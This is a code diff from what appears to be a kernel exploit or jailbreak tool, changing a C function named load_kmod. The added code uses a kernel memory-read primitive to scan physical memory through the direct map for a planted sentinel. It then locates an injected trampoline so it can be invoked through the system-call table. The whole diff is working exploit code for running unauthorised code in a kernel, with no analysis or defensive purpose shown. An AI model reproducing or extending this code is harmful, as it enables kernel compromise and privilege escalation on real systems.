@@ -681,12 +681,15 @@ static void load_kmod(void) {
             }
         }
 
-        /* Hierarchical page-table scan of kdata→top */
+        /* Hierarchical page-table scan of ktext→top
+         * Start from ktext (not kdata) because kmod may be loaded
+         * anywhere in the kernel VA range, including between ktext
+         * and kdata. */
         if (!trampoline_kva) {
-            printf("[*] Hierarchical scan: kdata → top...\n");
+            printf("[*] Hierarchical scan: ktext → top...\n");
             fflush(stdout);
 
-            uint64_t rs = g_kdata_base, re = 0xFFFFFFFFFFE00000ULL;
+            uint64_t rs = g_ktext_base, re = 0xFFFFFFFFFFE00000ULL;
             uint64_t va = rs & ~0x1FFFFFULL;
             uint64_t pages_checked = 0;
 
@@ -772,6 +775,69 @@ static void load_kmod(void) {
                 VA_NEXT_2MB(va, re);
             }
             printf("    Scanned %lu pages\n", (unsigned long)pages_checked);
+        }
+
+        /* Fallback: DMAP physical memory scan for the patched g_output_kva.
+         * The kmod's .data contains our unique patched value (result_kva).
+         * Finding it gives us the kmod's physical location, then we search
+         * nearby pages for the trampoline signature. */
+        if (!trampoline_kva) {
+            printf("[*] DMAP fallback: scanning physical memory for kmod data...\n");
+            fflush(stdout);
+
+            /* Scan first 4GB of physical memory in 4KB pages for the
+             * patched output_kva sentinel. This is a unique 8-byte value
+             * that only exists in the loaded kmod's .data section. */
+            uint64_t kmod_data_pa = 0;
+            uint64_t scan_limit = 0x100000000ULL; /* 4GB */
+            uint64_t phys_pages = 0;
+
+            for (uint64_t pa = 0; pa < scan_limit && !kmod_data_pa; pa += 0x1000) {
+                uint8_t pg[4096];
+                if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
+                phys_pages++;
+                for (int off = 0; off <= 4096 - 8; off += 8) {
+                    uint64_t val;
+                    memcpy(&val, pg + off, 8);
+                    if (val == result_kva) {
+                        kmod_data_pa = pa + off;
+                        printf("[+] Found patched g_output_kva at PA=0x%lx\n",
+                               (unsigned long)kmod_data_pa);
+                        break;
+                    }
+                }
+            }
+            printf("    Scanned %lu physical pages\n", (unsigned long)phys_pages);
+
+            if (kmod_data_pa) {
+                /* The kmod is small (~4KB). Scan nearby pages for the
+                 * trampoline signature. Check ±64KB around the data hit. */
+                uint64_t search_start = (kmod_data_pa > 0x10000) ?
+                                        (kmod_data_pa - 0x10000) & ~0xFFFULL : 0;
+                uint64_t search_end = kmod_data_pa + 0x10000;
+                if (search_end > scan_limit) search_end = scan_limit;
+
+                for (uint64_t pa = search_start; pa < search_end && !trampoline_kva;
+                     pa += 0x1000) {
+                    uint8_t pg[4096];
+                    if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
+                    for (int off = 0;
+                         off <= 4096 - suffix_off - (int)sizeof(tramp_suffix);
+                         off++) {
+                        if (memcmp(pg + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                            memcmp(pg + off + suffix_off, tramp_suffix,
+                                   sizeof(tramp_suffix)) == 0) {
+                            /* Found it! KVA = dmap_base + PA for sysent invocation */
+                            trampoline_kva = g_dmap_base + pa + off;
+                            memcpy(hdr, pg + off,
+                                   (4096 - off > 256) ? 256 : 4096 - off);
+                            printf("[+] Trampoline at PA=0x%lx DMAP=0x%lx\n",
+                                   (unsigned long)(pa + off),
+                                   (unsigned long)trampoline_kva);
+                        }
+                    }
+                }
+            }
         }
 
         if (trampoline_kva) {
